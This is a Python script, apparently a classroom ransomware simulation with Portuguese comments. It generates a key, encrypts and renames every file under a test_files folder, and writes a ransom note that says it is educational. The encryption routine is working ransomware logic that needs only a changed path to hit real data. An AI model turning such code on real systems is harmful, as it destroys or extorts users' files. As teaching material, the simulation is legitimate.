from cryptography.fernet import Fernet
import os

# --- DEFINIÇÃO DE CAMINHOS CHAVE ---
# Obtém o diretório ONDE o script ransomware.py está localizado (Malcode/ransomware_sim)
DIRETORIO_RAIZ = os.path.dirname(os.path.abspath(__file__))

# Define o caminho para a pasta alvo dos arquivos de teste (test_files/)
DIRETORIO_ALVO = os.path.join(DIRETORIO_RAIZ, 'test_files')

# Define o caminho para o arquivo da chave e da mensagem de resgate (na raiz do script)
CHAVE_PATH = os.path.join(DIRETORIO_RAIZ, "chave.key")
RESGATE_PATH = os.path.join(DIRETORIO_RAIZ, "LEIA ISSO.txt")
# ------------------------------------


# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    # Usa o caminho CHAVE_PATH definido acima
    with open(CHAVE_PATH, "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar chave salva
def carregar_chave():
    # Usa o caminho CHAVE_PATH definido acima
    return open(CHAVE_PATH, "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    # ⚠️ Adicionando renomeação para simular a extensão do ransomware
    novo_caminho = arquivo + ".malcode" 
    
    dados_encriptados = f.encrypt(dados)
    
    # Reescreve o conteúdo criptografado
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
        
    # Renomeia o arquivo original
    os.rename(arquivo, novo_caminho)

# 4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    # Usaremos os.walk para percorrer recursivamente
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            # Não criptografa a si mesmo, a chave, ou o arquivo de resgate.
            if nome in ["ransomware.py", "descriptografar.py", "LEIA ISSO.txt"]:
                continue
            if nome.endswith((".key", ".malcode", ".gitkeep")):
                continue
                
            caminho_completo = os.path.join(raiz, nome)
            lista.append(caminho_completo)
    return lista

# 5. Mensagem de resgate
def criar_mensagem_resgate():
    # Usa o caminho RESGATE_PATH definido acima
    with open(RESGATE_PATH, "w") as f:
        f.write("Seus arquivos foram criptografados pela simulação MALCODE!\n")
        f.write("Este é um projeto educacional.\n")
        f.write("A chave de descriptografia foi salva como 'chave.key' neste diretório.\n")

# 6. Execução principal
def main():
    # Apenas gera a chave se ela não existir, para não perder a chave a cada execução
    if not os.path.exists(CHAVE_PATH):
        gerar_chave()
        
    chave = carregar_chave()
    
    # Usa o DIRETORIO_ALVO já construído para iniciar a busca
    arquivos = encontrar_arquivos(DIRETORIO_ALVO)
    
    # Se a lista de arquivos estiver vazia, avisa.
    if not arquivos:
        print("AVISO: Nenhum arquivo alvo encontrado em test_files.")
        return

    for arquivo in arquivos:
        # Adicione uma verificação de segurança aqui
        if arquivo.endswith(".malcode"):
            continue 
            
        criptografar_arquivo(arquivo, chave)
        
    criar_mensagem_resgate()
    print("--- RANSOMWARE EXECUTADO COM SUCESSO ---")
    print(f"Arquivos em {DIRETORIO_ALVO} criptografados!")
    print(f"Chave salva em: {CHAVE_PATH}")

if __name__ == "__main__":
    main()












